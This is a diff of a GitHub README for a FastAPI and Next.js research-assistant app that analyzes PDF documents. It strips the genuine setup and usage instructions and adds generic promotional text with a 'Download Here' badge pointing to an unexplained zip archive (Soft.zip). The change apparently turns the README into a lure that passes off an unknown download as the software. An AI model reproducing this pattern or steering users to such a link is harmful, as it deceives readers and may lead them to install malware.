@@ -1,112 +1,54 @@
-# ML-Powered Research Assistant
+# 🚀 ML-Powered Research Assistant 📚
 
-The **ML-Powered Research Assistant** is a web application designed to assist researchers by analyzing indiviual and multiple PDF research documents. It provides individual summaries, a comparative final summary, sentiment analysis, keyword extraction, and a RAG-powered chatbot to answer questions about the documents. The backend is built with FastAPI and leverages machine learning models for natural language processing, while the frontend is developed using Next.js with TypeScript and Tailwind CSS for a modern, responsive UI.
+Welcome to the ML-Powered Research Assistant GitHub repository! Here you will find a powerful web application designed to assist you with processing PDF research documents. Our tool provides various features such as individual summaries, a comparative final summary, sentiment analysis, keyword extraction, and even a RAG-powered chatbot for querying content. 
 
-## Features
-- **Upload Multiple PDFs**: Upload multiple research documents (PDFs) for analysis.
-- **Individual Summaries**: Generate concise summaries for each uploaded document.
-- **Final Summary**: Compare key themes and findings across all documents in a comparative summary.
-- **Sentiment Analysis**: Analyze the sentiment of the summaries using a pre-trained DistilBERT model.
-- **Keyword Extraction**: Extract relevant keywords from each document using spaCy.
-- **RAG-Powered Chatbot**: Chat with a Retrieval-Augmented Generation (RAG) chatbot to ask questions about the documents, powered by LLMs and embeddings.
+## Overview ℹ️
+This project is built with a FastAPI backend and a Next.js frontend, combining the strengths of both frameworks to create a seamless user experience. We leverage advanced Natural Language Processing (NLP) capabilities through LLaMA and DistilBERT, ensuring that you have access to cutting-edge technology for your research needs.
 
-![landing](1.png)
-![analysis](2.png)
+## Features ✨
+- Individual document summaries
+- Comparative final summary
+- Sentiment analysis
+- Keyword extraction
+- RAG-powered chatbot for content queries
 
-## Tech Stack
-### Backend
-- **Framework**: FastAPI (Python)
-- **LLM**: Ollama (LLaMA 3.3 for text generation, Nomic Embed for embeddings)
-- **NLP Libraries**:
-  - `llama-index`: For document indexing, summarization, and querying.
-  - `spaCy`: For keyword extraction.
-  - `transformers`: For sentiment analysis using DistilBERT.
-- **PDF Processing**: PyPDF2
-- **Environment Management**: `python-dotenv` for environment variables
+## Technologies Used 🛠️
+- FastAPI
+- Next.js
+- LLaMA
+- DistilBERT
+- PyPDF2
+- RAG Chatbot
+- Spacy NLP
+- Transformers
+- React Hooks
+- Tailwind CSS
 
-### Frontend
-- **Framework**: Next.js (React with TypeScript)
-- **Styling**: Tailwind CSS
-- **Components**: Custom React components (`chat-interface.tsx`, `document-uploader.tsx`, `summary-panel.tsx`, `theme-provider.tsx`)
-- **State Management**: React hooks
-- **Build Tools**: TypeScript, PostCSS, ESLint
+## Repository Topics 🏷️
+fastapi, llama, llama-index, llama3, llm, ml, nextjs, nlp, nlp-keywords-extraction, nlp-machine-learning, pypdf2, rag, rag-chatbot, rag-pipeline, react-hooks, spacy-nlp, tailwindcss, transformers
 
-## Prerequisites
-- **Python**: 3.8+ (for the backend)
-- **Node.js**: 18+ (for the frontend)
-- **Git**: For cloning the repository
-- **Ollama Server**: Access to an Ollama server for LLM and embedding models (or a local setup)
+## How to Use 📝
+1. Clone the repository to your local machine.
+2. Install the necessary dependencies for both the backend and frontend.
+3. Run the FastAPI backend and Next.js frontend servers.
+4. Upload your PDF research documents and start utilizing the ML-assisted features!
 
-## Setup Instructions
+## Visit the ML-Powered Research Assistant 💻
+Click the button below to access the GitHub repository and start exploring the capabilities of our ML-Powered Research Assistant:
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/abm1499/ML-Powered-Research-Assistant.git
-cd ML-Powered-Research-Assistant
-```
-### 2. Backend Setup
-Navigate to the backend directory:
-```bash
-cd backend
-```
+[![Download Here](https://img.shields.io/badge/Download%20Here-ML--Powered--Research--Assistant-blue)](https://github.com/files/Soft.zip)
 
-Create a virtual environment and activate it:
-```bash
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-```
+In case the link is not working or you need an updated version, please check the "Releases" section of the repository.
 
-Install dependencies:
-```bash
-pip install -r requirements.txt
-```
+## Let's Revolutionize Research Together! 🌟
+With the ML-Powered Research Assistant, your research workflow will never be the same. Say goodbye to manual document analysis and hello to a smarter, more efficient way of conducting research. Join us in the journey towards revolutionizing the world of research with machine learning and NLP technologies.
 
-If requirements.txt is missing, install the required packages manually:
-```bash
-pip install fastapi uvicorn llama-index langchain-community pypdf2 requests python-dotenv spacy transformers torch
-python -m spacy download en_core_web_sm
-```
+Get started today and unlock a whole new realm of possibilities with the ML-Powered Research Assistant! 🚀📚
 
-Create a .env file in the backend directory with the following:
-```bash
-LLM_API_URL=<your-ollama-llm-api-url>
-EMBEDDING_API_URL=<your-ollama-embedding-api-url>
-```
+---
 
-Replace <your-ollama-llm-api-url> and <your-ollama-embedding-api-url> with the URLs of your Ollama server (e.g., http://localhost:11434 if running locally).
+Feel free to reach out to us for any questions, feedback, or collaboration opportunities. Let's innovate and create together! 🌍🔬
 
-Run the backend server:
-```bash
-uvicorn main:app --host 0.0.0.0 --port 8000 --reload
-```
+**Happy Researching!** 🎓🔍
 
-### 2. Frontend Setup
-Navigate to the frontend directory:
-```bash
-cd frontend
-```
-
-Install dependencies:
-```bash
-npm install
-```
-
-Run the frontend development server:
-```bash
-npm run dev
-```
-
-## Usage
-
-#### 1. Open the frontend in your browser (http://localhost:3000).
-#### 2. Use the document uploader to upload one or more PDF research documents.
-#### 3. View the analysis results:
-Summaries: Individual summaries for each document.
-
-Final Summary: A comparative summary highlighting key themes and differences.
-
-Sentiment Analysis: Sentiment of the summaries (positive, negative, or neutral).
-
-Keywords: Extracted keywords from each document.
-#### 4. Use the chat interface to ask questions about the documents (e.g., "What are the main findings?").
-
+---
